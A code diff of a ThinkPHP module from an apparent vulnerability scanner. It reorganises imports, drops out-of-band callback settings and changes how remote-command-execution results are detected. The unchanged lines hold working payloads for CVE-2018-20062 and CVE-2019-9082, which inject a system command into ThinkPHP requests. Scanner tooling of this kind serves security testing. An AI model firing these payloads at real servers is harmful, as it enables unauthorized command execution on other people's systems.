@@ -1,26 +1,24 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-import requests
 import threading
 from module import globals
 from core.verify import verify
+from thirdparty import requests
+from core.verify import misinformation
 from module.md5 import random_md5
-from requests.packages import urllib3
-from requests_toolbelt.utils import dump
-urllib3.disable_warnings()
+from thirdparty.requests_toolbelt.utils import dump
 
 
 class ThinkPHP():
     def __init__(self, url):
         self.url = url
+        if self.url[-1] == "/":
+            self.url = self.url[:-1]
         self.raw_data = None
         self.vul_info = {}
         self.ua = globals.get_value("UA")  # 获取全局变量UA
         self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
         self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
-        self.ceye_domain = globals.get_value("ceye_domain")
-        self.ceye_token = globals.get_value("ceye_token")
-        self.ceye_api = globals.get_value("ceye_api")
         self.threadLock = threading.Lock()
         self.payload_cve_2018_20062 = "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=RECOMMAND"
         self.payload_cve_2019_9082 = ("/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&"
@@ -57,7 +55,8 @@ class ThinkPHP():
         try:
             request = requests.post(self.url + self.path, data=self.payload, headers=self.headers, timeout=self.timeout,
                                          verify=False)
-            if md in request.text:
+            if md in misinformation(request.text, md):
+                self.vul_info["vul_payd"] = self.payload
                 self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
                 self.vul_info["prt_resu"] = "PoCSuCCeSS"
                 self.vul_info["prt_info"] = "[rce] [cmd:" + cmd + "]"
@@ -96,14 +95,13 @@ class ThinkPHP():
         self.payload = self.payload_cve_2019_9082.replace("RECOMMAND", cmd)
         self.method = "get"
         self.rawdata = "null"
-        bad = "20" + md
         try:
-            self.request = requests.get(self.url + self.payload, headers=self.headers, timeout=self.timeout, verify=False)
-            if md in self.request.text:
-                if bad not in self.request.text:
-                    self.vul_info["vul_data"] = dump.dump_all(self.request).decode('utf-8', 'ignore')
-                    self.vul_info["prt_resu"] = "PoCSuCCeSS"
-                    self.vul_info["prt_info"] = "[rce] [cmd:" + cmd + "]"
+            request = requests.get(self.url + self.payload, headers=self.headers, timeout=self.timeout, verify=False)
+            if md in misinformation(request.text, md):
+                self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
+                self.vul_info["vul_payd"] = self.payload
+                self.vul_info["prt_resu"] = "PoCSuCCeSS"
+                self.vul_info["prt_info"] = "[rce] [cmd:" + cmd + "]"
             verify.scan_print(self.vul_info)
         except requests.exceptions.Timeout:
             verify.timeout_print(self.vul_info["prt_name"])
